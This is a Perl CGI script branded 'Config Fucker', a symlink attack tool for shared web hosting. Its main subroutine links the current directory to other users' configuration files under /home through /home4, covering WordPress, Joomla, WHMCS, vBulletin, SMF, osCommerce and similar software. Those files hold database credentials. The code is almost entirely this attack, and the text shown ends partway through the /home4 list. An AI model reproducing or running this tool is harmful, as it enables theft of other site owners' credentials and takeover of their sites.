#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Config Fucker By X-1n73ct</title>
<link rel="shortcut icon" href="http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png"/>
<style type="text/css">
body {
	background-color: #000000;

}
.newStyle1 {
 font-family: Tahoma;
 font-size: x-small;
 font-weight: bold;
 color: #00ff00;
  text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$domain=$msr."/".$user;
$domain=~s/\n//g;
symlink('/home/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
 symlink('/home/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt');
 symlink('/home/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt');
 symlink('/home2/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home2/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home2/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home2/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home2/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home2/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home2/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home2/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home2/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home2/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home2/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home2/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home2/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home2/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home2/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home2/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home2/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home2/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home2/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home2/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home2/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home2/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home2/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home2/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home2/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home2/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home2/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home2/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home2/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home2/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home2/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home2/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home2/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home2/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home2/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home2/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home2/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home2/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home2/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home2/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home2/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
 symlink('/home2/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home2/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home2/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home2/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home2/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home2/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home2/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home2/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home2/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home2/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home2/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home2/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home2/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home2/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home2/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home2/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home2/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home2/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home2/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home2/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home2/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home2/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home2/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home2/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home2/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt'); 
 symlink('/home2/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home2/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt');
 symlink('/home3/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home3/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home3/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home3/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home3/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home3/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home3/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home3/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home3/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home3/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home3/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home3/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home3/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home3/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home3/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home3/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home3/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home3/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home3/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home3/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home3/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home3/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home3/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home3/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home3/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home3/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home3/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home3/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home3/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home3/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home3/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home3/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home3/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home3/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home3/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home3/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home3/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home3/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home3/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home3/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home3/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
 symlink('/home3/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.txt');
 symlink('/home3/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.txt');
 symlink('/home3/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.txt');
 symlink('/home3/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.txt');
 symlink('/home3/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.txt');
 symlink('/home3/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.txt');
 symlink('/home3/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.txt');
 symlink('/home3/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt');
 symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.txt');
 symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.txt');
 symlink('/home3/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.txt');
 symlink('/home3/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.txt');
 symlink('/home3/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.txt');
 symlink('/home3/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.txt');
 symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.txt');
 symlink('/home3/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.txt');
 symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.txt'); 
 symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.txt'); 
 symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>hop-ZCshop.txt'); 
 symlink('/home3/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.txt');
 symlink('/home3/'.$user.'/public_html/Settings.php',$domain.'~~>smf.txt'); 
 symlink('/home3/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.txt'); 
 symlink('/home3/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.txt'); 
 symlink('/home3/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.txt'); 
 symlink('/home3/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.txt');
 symlink('/home3/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.txt');
 symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.txt');
 symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.txt');
 symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.txt');
 symlink('/home3/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.txt');
 symlink('/home3/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.txt');
 symlink('/home3/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.txt');
 symlink('/home3/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.txt'); 
 symlink('/home3/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.txt'); 
 symlink('/home3/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.txt');
 symlink('/home3/'.$user.'/public_html/e107_config.php',$domain.'~>e107.txt');
 symlink('/home/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.txt');
 symlink('/home4/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.txt') ; 
 symlink('/home4/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.txt') ; 
 symlink('/home4/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.txt') ;
 symlink('/home4/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.txt') ;
 symlink('/home4/'.$user.'/public_html/config.php',$domain.'~~>Other.txt') ;
 symlink('/home4/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.txt');
 symlink('/home4/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.txt') ;
 symlink('/home4/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.txt') ; 
 symlink('/home4/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.txt') ; 
 symlink('/home4/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.txt') ; 
 symlink('/home4/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.txt') ;
 symlink('/home4/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.txt') ;
 symlink('/home4/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.txt');
 symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.txt') ; 
 symlink('/home4/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.txt');
 symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.txt');
 symlink('/home4/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.txt');
 symlink('/home4/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.txt'); 
 symlink('/home4/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.txt');
 symlink('/home4/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.txt'); 
 symlink('/home4/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.txt');
 symlink('/home4/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.txt');
 symlink('/home4/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.txt');
 symlink('/home4/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.txt');
 symlink('/home4/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.txt');
 symlink('/home4/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.txt');
 symlink('/home4/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.txt');
 symlink('/home4/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.txt');
 symlink('/home4/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.txt');
 symlink('/home4/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.txt');
 symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.txt');
 symlink('/home4/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.txt');
 symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.txt');
 symlink('/home4/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.txt');
 symlink('/home4/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.txt');
 symlink('/home4/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.txt');
 symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.txt') ; 
 symlink('/home4/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.txt') ; 
 symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.txt');
 symlink('/home4/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.txt');
 symlink('/home4/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.txt');
 symlink('/home4/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.txt');
 symlink('/home4/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.txt');
 symlink('/home4/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.txt');
 symlink('/home4/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home4/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.txt') ; 
 symlink('/home4/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.txt') ;
 symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.txt');
